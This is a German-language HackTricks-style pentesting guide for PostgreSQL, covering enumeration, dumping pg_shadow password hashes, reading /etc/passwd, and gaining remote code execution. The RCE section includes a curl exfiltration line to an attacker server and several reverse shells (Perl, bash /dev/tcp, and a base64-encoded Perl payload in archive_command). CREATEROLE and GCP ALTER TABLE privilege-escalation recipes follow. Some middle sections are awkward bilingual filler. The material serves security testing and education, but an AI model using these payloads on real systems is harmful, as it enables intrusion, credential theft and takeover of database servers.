# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## **Grundlegende Informationen**

**PostgreSQL** wird als ein **objektrelationales Datenbanksystem** beschrieben, das **Open Source** ist. Dieses System verwendet nicht nur die SQL-Sprache, sondern erweitert sie auch um zus√§tzliche Funktionen. Seine F√§higkeiten erm√∂glichen es, eine Vielzahl von Datentypen und Operationen zu verarbeiten, was es zu einer vielseitigen Wahl f√ºr Entwickler und Organisationen macht.

**Standardport:** 5432, und wenn dieser Port bereits verwendet wird, scheint PostgreSQL den n√§chsten Port (wahrscheinlich 5433), der nicht verwendet wird, zu verwenden.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Verbindung herstellen und grundlegende Enumeration

Um eine Verbindung zur PostgreSQL-Datenbank herzustellen, k√∂nnen Sie das `psql`-Tool verwenden:

```bash
psql -h <host> -p <port> -U <username> -d <database>
```

- `<host>`: Die IP-Adresse oder der Hostname des PostgreSQL-Servers.
- `<port>`: Der Port, auf dem der PostgreSQL-Server l√§uft (standardm√§√üig 5432).
- `<username>`: Der Benutzername, mit dem Sie sich anmelden m√∂chten.
- `<database>`: Der Name der Datenbank, zu der Sie eine Verbindung herstellen m√∂chten.

Nachdem Sie eine Verbindung hergestellt haben, k√∂nnen Sie grundlegende Enumerationstechniken verwenden, um Informationen √ºber die Datenbank zu sammeln:

- `SELECT version();`: Gibt die PostgreSQL-Version zur√ºck.
- `SELECT current_user;`: Gibt den aktuellen Benutzernamen zur√ºck.
- `SELECT current_database();`: Gibt den Namen der aktuellen Datenbank zur√ºck.
- `SELECT * FROM pg_user;`: Zeigt alle Benutzer in der Datenbank an.
- `SELECT * FROM pg_shadow;`: Zeigt alle Benutzer und deren verschl√ºsselte Passw√∂rter an.
- `SELECT * FROM pg_database;`: Zeigt alle Datenbanken auf dem Server an.
- `SELECT * FROM pg_tables;`: Zeigt alle Tabellen in der aktuellen Datenbank an.
- `SELECT * FROM information_schema.tables;`: Zeigt alle Tabellen in der aktuellen Datenbank an (alternative Methode).

Diese Enumerationstechniken helfen Ihnen dabei, grundlegende Informationen √ºber die PostgreSQL-Datenbank zu sammeln, was Ihnen bei weiteren Pentesting-Aktivit√§ten helfen kann.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Wenn Sie beim Ausf√ºhren von **`\list`** eine Datenbank namens **`rdsadmin`** finden, wissen Sie, dass Sie sich in einer **AWS PostgreSQL-Datenbank** befinden.
{% endhint %}

Weitere Informationen zum **Missbrauch einer PostgreSQL-Datenbank** finden Sie unter:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Automatische Enumeration
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Portscannen**

Laut [**dieser Untersuchung**](https://www.exploit-db.com/papers/13084) wirft `dblink` eine `sqlclient_unable_to_establish_sqlconnection` Ausnahme mit einer Erkl√§rung des Fehlers, wenn ein Verbindungsversuch fehlschl√§gt. Beispiele f√ºr diese Details sind unten aufgef√ºhrt.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Host ist nicht erreichbar

`DETAIL: Konnte keine Verbindung zum Server herstellen: Keine Route zum Host. L√§uft der Server auf dem Host "1.2.3.4" und akzeptiert TCP/IP-Verbindungen auf Port 5678?`

* Port ist geschlossen
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Port ist ge√∂ffnet
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
oder
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Der Port ist ge√∂ffnet oder gefiltert
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
In PL/pgSQL-Funktionen ist es derzeit nicht m√∂glich, Ausnahmedetails abzurufen. Wenn Sie jedoch direkten Zugriff auf den PostgreSQL-Server haben, k√∂nnen Sie die erforderlichen Informationen abrufen. Wenn das Extrahieren von Benutzernamen und Passw√∂rtern aus den Systemtabellen nicht m√∂glich ist, k√∂nnen Sie die im vorherigen Abschnitt diskutierte Methode des Wortlistenangriffs in Betracht ziehen, da dies m√∂glicherweise positive Ergebnisse liefert.

## Aufz√§hlung von Berechtigungen

### Rollen

| Rollentyp      |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rolle hat Superuser-Berechtigungen                                                                                                                   |
| rolinherit     | Rolle erbt automatisch Berechtigungen von Rollen, von denen sie Mitglied ist                                                                           |
| rolcreaterole  | Rolle kann weitere Rollen erstellen                                                                                                                  |
| rolcreatedb    | Rolle kann Datenbanken erstellen                                                                                                                     |
| rolcanlogin    | Rolle kann sich anmelden. Das hei√üt, diese Rolle kann als anf√§nglicher Sitzungsautorisierungs-Identifier angegeben werden                           |
| rolreplication | Rolle ist eine Replikationsrolle. Eine Replikationsrolle kann Replikationsverbindungen initiieren und Replikationsslots erstellen und l√∂schen.         |
| rolconnlimit   | F√ºr Rollen, die sich anmelden k√∂nnen, legt dies die maximale Anzahl gleichzeitiger Verbindungen fest, die diese Rolle herstellen kann. -1 bedeutet keine Begrenzung. |
| rolpassword    | Nicht das Passwort (wird immer als `********` angezeigt)                                                                                             |
| rolvaliduntil  | Ablaufzeit des Passworts (wird nur f√ºr die Passwortauthentifizierung verwendet); null, wenn kein Ablaufdatum vorhanden ist                           |
| rolbypassrls   | Rolle umgeht jede Richtlinie zur Zeilensicherheit. Weitere Informationen finden Sie in [Abschnitt 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html). |
| rolconfig      | Rollenspezifische Standardwerte f√ºr Laufzeitkonfigurationsvariablen                                                                                   |
| oid            | ID der Rolle                                                                                                                                         |

#### Interessante Gruppen

* Wenn Sie Mitglied von **`pg_execute_server_program`** sind, k√∂nnen Sie **Programme ausf√ºhren**
* Wenn Sie Mitglied von **`pg_read_server_files`** sind, k√∂nnen Sie **Dateien lesen**
* Wenn Sie Mitglied von **`pg_write_server_files`** sind, k√∂nnen Sie **Dateien schreiben**

{% hint style="info" %}
Beachten Sie, dass in Postgres ein **Benutzer**, eine **Gruppe** und eine **Rolle** dasselbe ist. Es h√§ngt nur davon ab, **wie Sie es verwenden** und ob Sie es **zulassen, sich anzumelden**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabellen

PostgreSQL organizes data into tables, which are composed of rows and columns. Each table has a name and a set of columns, which define the structure of the data stored in the table. 

PostgreSQL organisiert Daten in Tabellen, die aus Zeilen und Spalten bestehen. Jede Tabelle hat einen Namen und eine Reihe von Spalten, die die Struktur der in der Tabelle gespeicherten Daten definieren. 

### Creating Tables

To create a table in PostgreSQL, you can use the `CREATE TABLE` statement. This statement allows you to specify the name of the table and the columns it will contain, along with their data types and any constraints.

Um eine Tabelle in PostgreSQL zu erstellen, k√∂nnen Sie den Befehl `CREATE TABLE` verwenden. Mit diesem Befehl k√∂nnen Sie den Namen der Tabelle und die enthaltenen Spalten angeben, zusammen mit ihren Datentypen und etwaigen Einschr√§nkungen.

Here is an example of creating a table called `users` with three columns: `id`, `name`, and `email`.

Hier ist ein Beispiel f√ºr die Erstellung einer Tabelle namens `users` mit drei Spalten: `id`, `name` und `email`.

```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    name VARCHAR(50) NOT NULL,
    email VARCHAR(100) UNIQUE
);
```

### Inserting Data

Once you have created a table, you can insert data into it using the `INSERT INTO` statement. This statement allows you to specify the table name and the values to be inserted into each column.

Nachdem Sie eine Tabelle erstellt haben, k√∂nnen Sie Daten mit dem Befehl `INSERT INTO` in die Tabelle einf√ºgen. Mit diesem Befehl k√∂nnen Sie den Tabellennamen und die Werte angeben, die in jede Spalte eingef√ºgt werden sollen.

Here is an example of inserting a new row into the `users` table:

Hier ist ein Beispiel f√ºr das Einf√ºgen einer neuen Zeile in die Tabelle `users`:

```sql
INSERT INTO users (name, email)
VALUES ('John Doe', 'john.doe@example.com');
```

### Querying Data

To retrieve data from a table, you can use the `SELECT` statement. This statement allows you to specify the columns you want to retrieve and any conditions that the retrieved rows must meet.

Um Daten aus einer Tabelle abzurufen, k√∂nnen Sie den Befehl `SELECT` verwenden. Mit diesem Befehl k√∂nnen Sie die Spalten angeben, die Sie abrufen m√∂chten, sowie alle Bedingungen, die die abgerufenen Zeilen erf√ºllen m√ºssen.

Here is an example of querying the `users` table to retrieve all rows:

Hier ist ein Beispiel f√ºr die Abfrage der Tabelle `users`, um alle Zeilen abzurufen:

```sql
SELECT * FROM users;
```

### Updating Data

To update data in a table, you can use the `UPDATE` statement. This statement allows you to specify the table name, the columns to be updated, and the new values for those columns. You can also include conditions to update only specific rows.

Um Daten in einer Tabelle zu aktualisieren, k√∂nnen Sie den Befehl `UPDATE` verwenden. Mit diesem Befehl k√∂nnen Sie den Tabellennamen, die zu aktualisierenden Spalten und die neuen Werte f√ºr diese Spalten angeben. Sie k√∂nnen auch Bedingungen angeben, um nur bestimmte Zeilen zu aktualisieren.

Here is an example of updating the `email` column of a specific row in the `users` table:

Hier ist ein Beispiel f√ºr das Aktualisieren der Spalte `email` einer bestimmten Zeile in der Tabelle `users`:

```sql
UPDATE users
SET email = 'new.email@example.com'
WHERE id = 1;
```

### Deleting Data

To delete data from a table, you can use the `DELETE FROM` statement. This statement allows you to specify the table name and any conditions to delete only specific rows.

Um Daten aus einer Tabelle zu l√∂schen, k√∂nnen Sie den Befehl `DELETE FROM` verwenden. Mit diesem Befehl k√∂nnen Sie den Tabellennamen und alle Bedingungen angeben, um nur bestimmte Zeilen zu l√∂schen.

Here is an example of deleting a specific row from the `users` table:

Hier ist ein Beispiel f√ºr das L√∂schen einer bestimmten Zeile aus der Tabelle `users`:

```sql
DELETE FROM users
WHERE id = 1;
```

### Conclusion

Tables are the fundamental building blocks of a PostgreSQL database. Understanding how to create, insert, query, update, and delete data from tables is essential for working with PostgreSQL effectively.

Tabellen sind die grundlegenden Bausteine einer PostgreSQL-Datenbank. Das Verst√§ndnis daf√ºr, wie man Daten in Tabellen erstellt, einf√ºgt, abfragt, aktualisiert und l√∂scht, ist f√ºr die effektive Arbeit mit PostgreSQL unerl√§sslich.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funktionen

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. Functions can be created using the `CREATE FUNCTION` statement and can be called using the `SELECT` statement.

In PostgreSQL, functions can be written in various programming languages such as SQL, PL/pgSQL, PL/Python, PL/Perl, PL/Tcl, and more. Each language has its own syntax and capabilities.

To create a function, you need to specify the function name, input parameters (if any), return type, and the code block that defines the function's behavior. The code block can contain SQL statements, control structures, and other programming constructs.

Here is an example of a simple function that calculates the square of a number:

```sql
CREATE FUNCTION calculate_square(num INT)
RETURNS INT AS $$
BEGIN
    RETURN num * num;
END;
$$ LANGUAGE plpgsql;
```

In this example, the function `calculate_square` accepts an integer parameter `num` and returns an integer value. The code block multiplies the input parameter by itself and returns the result.

To call the function and retrieve the result, you can use the `SELECT` statement:

```sql
SELECT calculate_square(5);
```

This will return the value `25`, which is the square of `5`.

Functions in PostgreSQL can be very powerful and flexible. They can be used to encapsulate complex logic, perform calculations, manipulate data, and more. By using functions, you can modularize your code and make it more reusable and maintainable.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Dateisystemaktionen

### Verzeichnisse und Dateien lesen

Von diesem [**Commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) k√∂nnen Mitglieder der definierten Gruppe **`DEFAULT_ROLE_READ_SERVER_FILES`** (genannt **`pg_read_server_files`**) und **Superuser** die Methode **`COPY`** auf jedem Pfad verwenden (siehe `convert_and_check_filename` in `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Denken Sie daran, dass Sie, wenn Sie kein Superuser sind, aber √ºber die Berechtigungen **CREATEROLE** verf√ºgen, sich **selbst Mitglied dieser Gruppe machen k√∂nnen:**
```sql
GRANT pg_read_server_files TO username;
```
[**Weitere Informationen.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Es gibt **weitere PostgreSQL-Funktionen**, die verwendet werden k√∂nnen, um eine Datei zu **lesen oder ein Verzeichnis aufzulisten**. Nur **Superuser** und **Benutzer mit expliziten Berechtigungen** k√∂nnen sie verwenden:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Sie k√∂nnen **weitere Funktionen** unter [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html) finden.

### Einfaches Schreiben von Dateien

Nur **Superuser** und Mitglieder von **`pg_write_server_files`** k√∂nnen `copy` verwenden, um Dateien zu schreiben.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Denken Sie daran, dass Sie, wenn Sie kein Superuser sind, aber √ºber die **`CREATEROLE`**-Berechtigungen verf√ºgen, sich **selbst Mitglied dieser Gruppe machen k√∂nnen:**
```sql
GRANT pg_write_server_files TO username;
```
[**Weitere Informationen.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Beachten Sie, dass COPY keine Zeilenumbr√ºche verarbeiten kann. Daher m√ºssen Sie selbst bei Verwendung einer Base64-Payload **eine Einzeiler senden**.\
Eine sehr wichtige Einschr√§nkung dieser Technik ist, dass **`copy` nicht zum Schreiben von Bin√§rdateien verwendet werden kann, da es einige bin√§re Werte √§ndert**.

### **Hochladen von Bin√§rdateien**

Es gibt jedoch **andere Techniken zum Hochladen gro√üer Bin√§rdateien:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern f√ºr Hacker erstellt wurde**! Treten Sie uns noch heute unter [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und verdienen Sie Pr√§mien von bis zu **100.000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE zu einem Programm**

Seit [Version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html) k√∂nnen nur **Superuser** und Mitglieder der Gruppe **`pg_execute_server_program`** COPY f√ºr RCE verwenden (Beispiel mit Exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Beispiel zur Ausf√ºhrung:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Denken Sie daran, dass Sie, wenn Sie kein Superuser sind, aber √ºber die **`CREATEROLE`**-Berechtigungen verf√ºgen, sich **als Mitglied dieser Gruppe** hinzuf√ºgen k√∂nnen:
```sql
GRANT pg_execute_server_program TO username;
```
[**Weitere Informationen**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Oder verwenden Sie das Modul `multi/postgres/postgres_copy_from_program_cmd_exec` von **Metasploit**. Weitere Informationen zu dieser Schwachstelle finden Sie [**hier**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Obwohl es als CVE-2019-9193 gemeldet wurde, erkl√§rte Postges, dass dies ein [Feature ist und nicht behoben wird](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE mit PostgreSQL-Sprachen

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE mit PostgreSQL-Erweiterungen

Sobald Sie aus dem vorherigen Beitrag **gelernt haben, wie man bin√§re Dateien hochl√§dt**, k√∂nnen Sie versuchen, **RCE zu erlangen, indem Sie eine PostgreSQL-Erweiterung hochladen und laden**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE mit PostgreSQL-Konfigurationsdatei

Die **Konfigurationsdatei** von PostgreSQL ist vom **postgres-Benutzer beschreibbar**, der die Datenbank ausf√ºhrt. Als **Superuser** k√∂nnen Sie daher Dateien im Dateisystem schreiben und somit diese Datei **√ºberschreiben**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE mit ssl\_passphrase\_command**

Weitere Informationen [zu dieser Technik finden Sie hier](https://pulsesecurity.co.nz/articles/postgres-sqli).

Die Konfigurationsdatei enth√§lt einige interessante Attribute, die zu RCE f√ºhren k√∂nnen:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Pfad zum privaten Schl√ºssel der Datenbank
* `ssl_passphrase_command = ''` Wenn die private Datei durch ein Passwort gesch√ºtzt ist (verschl√ºsselt), f√ºhrt PostgreSQL den in diesem Attribut angegebenen Befehl aus.
* `ssl_passphrase_command_supports_reload = off` **Wenn** dieses Attribut **aktiviert ist**, wird der **Befehl**, der ausgef√ºhrt wird, wenn der Schl√ºssel durch ein Passwort gesch√ºtzt ist, **ausgef√ºhrt**, wenn `pg_reload_conf()` **ausgef√ºhrt** wird.

Ein Angreifer muss dann folgende Schritte ausf√ºhren:

1. **Private Schl√ºssel** vom Server **dumpen**
2. Heruntergeladenen privaten Schl√ºssel **verschl√ºsseln**:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **√úberschreiben**
4. Die aktuelle PostgreSQL-**Konfiguration** **dumpen**
5. Die **Konfiguration** mit den genannten Attributen konfigurieren:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()` ausf√ºhren

Beim Testen habe ich festgestellt, dass dies nur funktioniert, wenn die **Private-Schl√ºsseldatei die Berechtigungen 640** hat, sie **root geh√∂rt** und der **Gruppe ssl-cert oder postgres** (damit der postgres-Benutzer sie lesen kann) und sich in _/var/lib/postgresql/12/main_ befindet.

#### **RCE mit archive\_command**

**Weitere** [**Informationen zu dieser Konfiguration und zu WAL finden Sie hier**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Ein weiteres Attribut in der Konfigurationsdatei, das ausgenutzt werden kann, ist `archive_command`.

Damit dies funktioniert, muss die Einstellung `archive_mode` auf `'on'` oder `'always'` gesetzt sein. Wenn dies der Fall ist, k√∂nnen wir den Befehl in `archive_command` √ºberschreiben und ihn √ºber die WAL (Write-Ahead Logging)-Operationen ausf√ºhren.

Die allgemeinen Schritte sind:

1. √úberpr√ºfen Sie, ob der Archivmodus aktiviert ist: `SELECT current_setting('archive_mode')`
2. √úberschreiben Sie `archive_command` mit der Payload. Zum Beispiel ein Reverse-Shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Konfiguration neu laden: `SELECT pg_reload_conf()`
4. Erzwingen Sie die Ausf√ºhrung der WAL-Operation, die den Archivbefehl aufruft: `SELECT pg_switch_wal()` oder `SELECT pg_switch_xlog()` f√ºr einige Postgres-Versionen

## **Postgres-Privilegieneskalation**

### CREATEROLE-Privilegieneskalation

#### **Grant**

Gem√§√ü der [**Dokumentation**](https://www.postgresql.org/docs/13/sql-grant.html): _Rollen mit dem **`CREATEROLE`**-Privileg k√∂nnen die Mitgliedschaft in jeder Rolle **gew√§hren oder widerrufen**, die **kein Superuser** ist._

Wenn Sie also die Berechtigung **`CREATEROLE`** haben, k√∂nnen Sie sich Zugriff auf andere **Rollen** (die keine Superuser sind) gew√§hren, die Ihnen die M√∂glichkeit geben, Dateien zu lesen und zu schreiben und Befehle auszuf√ºhren:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Passwort √§ndern

Benutzer mit dieser Rolle k√∂nnen auch die Passw√∂rter anderer Nicht-Superbenutzer **√§ndern**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc zu SUPERUSER

Es ist ziemlich √ºblich, dass **lokale Benutzer sich in PostgreSQL ohne Angabe eines Passworts anmelden k√∂nnen**. Daher k√∂nnen Sie, sobald Sie **Berechtigungen zum Ausf√ºhren von Code gesammelt haben**, diese Berechtigungen missbrauchen, um die **`SUPERUSER`**-Rolle zu erhalten:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Dies ist in der Regel m√∂glich aufgrund der folgenden Zeilen in der Datei **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE Berechtigungserh√∂hung**

In [**diesem Bericht**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) wird erkl√§rt, wie es m√∂glich war, in Postgres GCP eine **Berechtigungserh√∂hung** durchzuf√ºhren, indem das ALTER TABLE-Privileg missbraucht wurde, das dem Benutzer gew√§hrt wurde.

Wenn Sie versuchen, einen anderen Benutzer zum Besitzer einer Tabelle zu machen, sollten Sie einen Fehler erhalten, der dies verhindert. Aber anscheinend hat GCP diese Option dem nicht-superuser postgres-Benutzer in GCP gegeben:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Wenn man diese Idee mit der Tatsache kombiniert, dass bei der Ausf√ºhrung von INSERT/UPDATE/ANALYZE-Befehlen auf einer Tabelle mit einer Indexfunktion die Funktion als Teil des Befehls mit den Berechtigungen des Tabellenbesitzers aufgerufen wird, ist es m√∂glich, einen Index mit einer Funktion zu erstellen und dem Besitzer des Tabellenberechtigungen zu geben. Anschlie√üend kann ANALYZE √ºber die Tabelle mit der b√∂sartigen Funktion ausgef√ºhrt werden, die Befehle ausf√ºhren kann, da sie die Berechtigungen des Besitzers verwendet.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Ausnutzung

1. Beginnen Sie damit, eine neue Tabelle zu erstellen.
2. F√ºgen Sie irrelevante Inhalte in die Tabelle ein, um Daten f√ºr die Indexfunktion bereitzustellen.
3. Entwickeln Sie eine b√∂sartige Indexfunktion, die einen Code-Ausf√ºhrungspayload enth√§lt und es erm√∂glicht, nicht autorisierte Befehle auszuf√ºhren.
4. √Ñndern Sie den Besitzer der Tabelle in "cloudsqladmin", was die Superuser-Rolle von GCP ist und ausschlie√ülich von Cloud SQL zur Verwaltung und Wartung der Datenbank verwendet wird.
